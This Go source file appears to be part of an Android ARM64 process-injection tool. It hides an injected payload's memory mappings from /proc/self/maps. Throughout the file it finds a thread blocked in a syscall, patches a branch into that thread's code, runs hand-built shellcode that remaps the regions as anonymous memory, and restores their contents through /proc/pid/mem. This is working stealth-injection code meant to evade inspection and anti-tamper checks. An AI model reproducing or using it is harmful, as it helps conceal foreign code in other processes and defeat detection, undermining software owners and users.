package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"time"
)

// AnonymizePayloadMappings replaces file-backed VMAs of the payload with anonymous
// mappings. After this, /proc/self/maps no longer shows the payload path.
//
// Strategy:
//  1. Find all VMAs in the child that reference the payload path
//  2. For each VMA, inject a shellcode stub that calls mmap(MAP_FIXED|MAP_ANON)
//  3. Write the original page contents back via /proc/pid/mem
//
// The result: maps shows anonymous regions instead of a file path.
func AnonymizePayloadMappings(pid int, payloadPath string, trapAddr uint64) error {
	ranges, err := ParseMaps(pid)
	if err != nil {
		return fmt.Errorf("cannot read maps: %w", err)
	}

	// Collect all VMAs belonging to the payload
	type vmaInfo struct {
		start uint64
		end   uint64
		perms string
	}
	var payloadVMAs []vmaInfo

	for _, r := range ranges {
		if r.Path != "" && (strings.Contains(r.Path, payloadPath) ||
			(strings.Contains(r.Path, "(deleted)") && len(payloadPath) > 0)) {
			payloadVMAs = append(payloadVMAs, vmaInfo{
				start: r.Start,
				end:   r.End,
				perms: r.Perms,
			})
		}
	}

	if len(payloadVMAs) == 0 {
		LogWarn("no payload VMAs found to anonymize")
		return nil
	}

	LogInfo("anonymizing payload mappings", "count", len(payloadVMAs))

	for _, vma := range payloadVMAs {
		if err := anonymizeVMA(pid, vma.start, vma.end, vma.perms, trapAddr); err != nil {
			LogWarn("failed to anonymize VMA", "start", vma.start, "error", err)
		} else {
			LogDebug("anonymized VMA", "start", vma.start, "end", vma.end, "perms", vma.perms)
		}
	}

	return nil
}

// anonymizeVMA replaces a single file-backed VMA with an anonymous mapping.
func anonymizeVMA(pid int, start, end uint64, perms string, trapAddr uint64) error {
	size := end - start
	if size == 0 || size > 64*1024*1024 { // sanity: skip if > 64MB
		return nil
	}

	// Step 1: Read current contents via /proc/pid/mem
	contents, err := ReadMem(pid, start, int(size))
	if err != nil {
		return fmt.Errorf("cannot read VMA contents: %w", err)
	}

	// Step 2: Execute mmap(MAP_FIXED|MAP_ANON) inside the target process
	prot := permsToProtFlags(perms)
	err = executeRemapInProcess(pid, start, size, prot, trapAddr)
	if err != nil {
		return fmt.Errorf("in-process remap failed: %w", err)
	}

	// Step 3: Write original contents back to the now-anonymous mapping
	// Need PROT_WRITE to write back. If the original didn't have write, we'll
	// need to mprotect first. But since we specified prot in mmap, and we're
	// writing via /proc/pid/mem (which bypasses page permissions), this works.
	if err := WriteMem(pid, start, contents); err != nil {
		return fmt.Errorf("cannot restore VMA contents: %w", err)
	}

	return nil
}

// executeRemapInProcess injects and executes a mmap(MAP_FIXED|MAP_ANON) syscall
// inside the target process by hijacking a thread's blocked syscall.
func executeRemapInProcess(pid int, addr, size uint64, prot int, trapAddr uint64) error {
	// Find a RW region for our mailbox
	rwBase, err := GetModuleRWSegment(pid, "libandroid_runtime.so")
	if err != nil {
		rwBase, err = GetModuleRWSegment(pid, "linker64")
		if err != nil {
			return fmt.Errorf("cannot find RW segment for mailbox: %w", err)
		}
	}
	mailboxAddr := rwBase + 0x1FE0

	// Clear mailbox
	if err := WritePointer(pid, mailboxAddr, 0); err != nil {
		return err
	}

	// Build the remap stub
	stub := buildRemapStub(addr, size, prot, mailboxAddr)

	// Backup trap region
	backup, err := ReadMem(pid, trapAddr, len(stub))
	if err != nil {
		return fmt.Errorf("cannot backup trap region: %w", err)
	}

	// Write stub
	if err := WriteMem(pid, trapAddr, stub); err != nil {
		return fmt.Errorf("cannot write remap stub: %w", err)
	}

	// Hijack a thread to execute the stub
	err = hijackThreadWithRetry(pid, trapAddr, 10, 200*time.Millisecond)
	if err != nil {
		_ = WriteMem(pid, trapAddr, backup)
		return fmt.Errorf("thread hijack failed: %w", err)
	}

	// Poll mailbox for completion
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		val, err := ReadPointer(pid, mailboxAddr)
		if err == nil && val != 0 {
			_ = WriteMem(pid, trapAddr, backup)
			return nil
		}
		time.Sleep(2 * time.Millisecond)
	}

	_ = WriteMem(pid, trapAddr, backup)
	return fmt.Errorf("remap mailbox timeout")
}

func hijackThreadWithRetry(pid int, shellcodeAddr uint64, attempts int, delay time.Duration) error {
	if attempts <= 0 {
		attempts = 1
	}
	var lastErr error
	for i := 0; i < attempts; i++ {
		if err := hijackThreadForExecution(pid, shellcodeAddr); err == nil {
			return nil
		} else {
			lastErr = err
		}
		if i+1 < attempts {
			time.Sleep(delay)
		}
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("thread hijack failed")
	}
	return lastErr
}

// hijackThreadForExecution finds a thread blocked in a syscall and patches
// the svc instruction to branch to our shellcode.
func hijackThreadForExecution(pid int, shellcodeAddr uint64) error {
	taskDir := fmt.Sprintf("/proc/%d/task", pid)
	entries, err := os.ReadDir(taskDir)
	if err != nil {
		return fmt.Errorf("cannot read task dir: %w", err)
	}

	for _, entry := range entries {
		tidStr := entry.Name()
		syscallPath := fmt.Sprintf("/proc/%d/task/%s/syscall", pid, tidStr)
		data, err := os.ReadFile(syscallPath)
		if err != nil {
			continue
		}

		// Format: "syscall_nr arg0 arg1 ... sp pc"
		// "running" means not in a syscall
		content := strings.TrimSpace(string(data))
		if content == "running" {
			continue
		}

		fields := strings.Fields(content)
		if len(fields) < 9 {
			continue
		}

		// Parse PC (last field) — on some kernels the resume PC (svc+4),
		// on others the svc address itself. Handle both conventions.
		var pc uint64
		_, err = fmt.Sscanf(fields[len(fields)-1], "0x%x", &pc)
		if err != nil || pc == 0 {
			continue
		}

		// Locate the actual svc instruction by probing PC and PC-4
		svcPC := uint64(0)
		for _, candidate := range []uint64{pc - 4, pc} {
			raw, err := ReadMem(pid, candidate, 4)
			if err != nil {
				continue
			}
			if binary.LittleEndian.Uint32(raw) == 0xd4000001 {
				svcPC = candidate
				break
			}
		}
		if svcPC == 0 {
			continue
		}
		resumePC := svcPC + 4

		origInstr, err := ReadMem(pid, resumePC, 4)
		if err != nil {
			continue
		}

		// Calculate branch offset from resumePC to shellcode
		offset := int64(shellcodeAddr) - int64(resumePC)
		if offset%4 != 0 {
			continue
		}
		imm26 := int64(offset / 4)
		if imm26 > 0x1FFFFFF || imm26 < -0x2000000 {
			continue
		}

		// Encode B <shellcodeAddr> and patch the resume point
		branchInstr := uint32(0x14000000) | uint32(imm26&0x3FFFFFF)
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, branchInstr)

		if err := WriteMem(pid, resumePC, buf); err != nil {
			continue
		}

		// Store restore info: resume PC and original instruction there
		_ = WritePointer(pid, shellcodeAddr+0xE0, resumePC)
		_ = WriteU32(pid, shellcodeAddr+0xE8, binary.LittleEndian.Uint32(origInstr))

		LogDebug("hijacked thread", "tid", tidStr, "svcPC", svcPC, "resumePC", resumePC)
		return nil
	}

	return fmt.Errorf("no suitable thread found for hijack")
}

// buildRemapStub creates ARM64 shellcode that:
// 1. Saves registers
// 2. Calls mmap(MAP_FIXED|MAP_ANON) to replace the VMA
// 3. Signals completion via mailbox
// 4. Restores the hijacked instruction at original PC
// 5. Branches back to original PC to re-execute the syscall
func buildRemapStub(addr, size uint64, prot int, mailboxAddr uint64) []byte {
	stub := make([]byte, 256)

	// Save x0-x8, x30
	binary.LittleEndian.PutUint32(stub[0x00:], 0xd10203ff) // sub sp, sp, #128
	binary.LittleEndian.PutUint32(stub[0x04:], 0xa90007e0) // stp x0, x1, [sp, #0]
	binary.LittleEndian.PutUint32(stub[0x08:], 0xa9010fe2) // stp x2, x3, [sp, #16]
	binary.LittleEndian.PutUint32(stub[0x0c:], 0xa90217e4) // stp x4, x5, [sp, #32]
	binary.LittleEndian.PutUint32(stub[0x10:], 0xa9031fe6) // stp x6, x7, [sp, #48]
	binary.LittleEndian.PutUint32(stub[0x14:], 0xf90023e8) // str x8, [sp, #64]
	binary.LittleEndian.PutUint32(stub[0x18:], 0xf90027fe) // str x30, [sp, #72]

	// mmap(addr, size, prot, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)
	// SYS_mmap = 222 on arm64
	// flags = MAP_FIXED(0x10) | MAP_ANONYMOUS(0x20) | MAP_PRIVATE(0x02) = 0x32
	binary.LittleEndian.PutUint32(stub[0x1c:], encodeLdr(0, 0x1c, 0xC0))   // ldr x0, [addr]
	binary.LittleEndian.PutUint32(stub[0x20:], encodeLdr(1, 0x20, 0xC8))   // ldr x1, [size]
	binary.LittleEndian.PutUint32(stub[0x24:], encodeMov(2, uint16(prot))) // mov x2, #prot
	binary.LittleEndian.PutUint32(stub[0x28:], 0xd2800643)                 // mov x3, #0x32
	binary.LittleEndian.PutUint32(stub[0x2c:], 0x92800004)                 // mov x4, #-1 (fd)
	binary.LittleEndian.PutUint32(stub[0x30:], 0xd2800005)                 // mov x5, #0 (offset)
	binary.LittleEndian.PutUint32(stub[0x34:], 0xd2801bc8)                 // mov x8, #222 (SYS_mmap)
	binary.LittleEndian.PutUint32(stub[0x38:], 0xd4000001)                 // svc #0

	// Signal completion: store 1 to mailbox
	binary.LittleEndian.PutUint32(stub[0x3c:], encodeLdr(1, 0x3c, 0xD0)) // ldr x1, [mailbox]
	binary.LittleEndian.PutUint32(stub[0x40:], 0xd2800020)               // mov x0, #1
	binary.LittleEndian.PutUint32(stub[0x44:], 0xf9000020)               // str x0, [x1]

	// Restore the original svc instruction at the hijacked PC
	binary.LittleEndian.PutUint32(stub[0x48:], encodeLdr(9, 0x48, 0xE0))  // ldr x9, [orig_pc]
	binary.LittleEndian.PutUint32(stub[0x4c:], encodeLdr(10, 0x4c, 0xE8)) // ldr x10, [orig_instr]
	binary.LittleEndian.PutUint32(stub[0x50:], 0xb9000129)                // str w10, [x9]

	// Restore registers
	binary.LittleEndian.PutUint32(stub[0x54:], 0xa94007e0) // ldp x0, x1, [sp, #0]
	binary.LittleEndian.PutUint32(stub[0x58:], 0xa9410fe2) // ldp x2, x3, [sp, #16]
	binary.LittleEndian.PutUint32(stub[0x5c:], 0xa94217e4) // ldp x4, x5, [sp, #32]
	binary.LittleEndian.PutUint32(stub[0x60:], 0xa9431fe6) // ldp x6, x7, [sp, #48]
	binary.LittleEndian.PutUint32(stub[0x64:], 0xf94023e8) // ldr x8, [sp, #64]
	binary.LittleEndian.PutUint32(stub[0x68:], 0xf94027fe) // ldr x30, [sp, #72]
	binary.LittleEndian.PutUint32(stub[0x6c:], 0x910203ff) // add sp, sp, #128

	// Branch back to original PC (re-execute the restored svc #0)
	binary.LittleEndian.PutUint32(stub[0x70:], 0xd61f0120) // br x9

	// [0xC0] Data slots
	binary.LittleEndian.PutUint64(stub[0xC0:], addr)        // mmap target address
	binary.LittleEndian.PutUint64(stub[0xC8:], size)        // mmap size
	binary.LittleEndian.PutUint64(stub[0xD0:], mailboxAddr) // mailbox address
	// [0xE0] original PC — written by hijackThreadForExecution
	// [0xE8] original instruction — written by hijackThreadForExecution

	return stub
}

// permsToProtFlags converts a maps permission string (e.g. "r-xp") to PROT_ flags.
func permsToProtFlags(perms string) int {
	prot := 0
	if len(perms) >= 1 && perms[0] == 'r' {
		prot |= 1 // PROT_READ
	}
	if len(perms) >= 2 && perms[1] == 'w' {
		prot |= 2 // PROT_WRITE
	}
	if len(perms) >= 3 && perms[2] == 'x' {
		prot |= 4 // PROT_EXEC
	}
	return prot
}
